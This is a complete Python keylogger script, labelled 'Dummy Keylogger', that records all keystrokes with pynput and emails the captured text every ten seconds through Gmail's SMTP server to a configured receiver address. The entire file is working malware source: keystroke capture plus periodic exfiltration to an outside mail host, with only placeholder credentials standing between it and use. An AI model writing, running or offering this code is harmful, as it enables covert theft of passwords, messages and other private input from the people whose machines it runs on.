from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading

# Global variables for storing keystrokes
text = ""
text_lock = threading.Lock()
time_interval = 10  # seconds

# Email configuration - update these with your dummy account details
sender_email = "your_dummy_email@gmail.com"
receiver_email = "your_receiver_email@example.com"  # Can be the same as sender_email for testing
password = "your_app_specific_password"  # Use an app password if needed

def send_email(data):
    try:
        # Compose the email
        message = MIMEMultipart("alternative")
        message["Subject"] = "Dummy Keylogger Data"
        message["From"] = sender_email
        message["To"] = receiver_email

        # Email body containing the captured keystrokes
        body = f"Captured keystrokes:\n{data}"
        part = MIMEText(body, "plain")
        message.attach(part)

        # Connect to the SMTP server (using Gmail as an example)
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Email sending failed: {e}")

def send_data():
    global text
    with text_lock:
        data_to_send = text
        text = ""  # Clear buffer after sending

    if data_to_send:
        send_email(data_to_send)

    # Schedule the next email sending
    timer = threading.Timer(time_interval, send_data)
    timer.daemon = True  # Terminates when the main thread exits
    timer.start()

def on_release(key):
    global text
    try:
        with text_lock:
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
                pass
            elif key == keyboard.Key.backspace:
                text = text[:-1] if len(text) > 0 else ""
            elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
                pass
            elif key == keyboard.Key.esc:
                return False  # Stop listener
            elif isinstance(key, keyboard.Key):
                pass  # Ignore other special keys
            else:
                if hasattr(key, 'char'):
                    text += key.char
    except Exception as e:
        print(f"Error handling key: {e}")

# Start the keyboard listener and the periodic email sending
with keyboard.Listener(on_release=on_release) as listener:
    send_data()  # Begin periodic email sending
    listener.join()
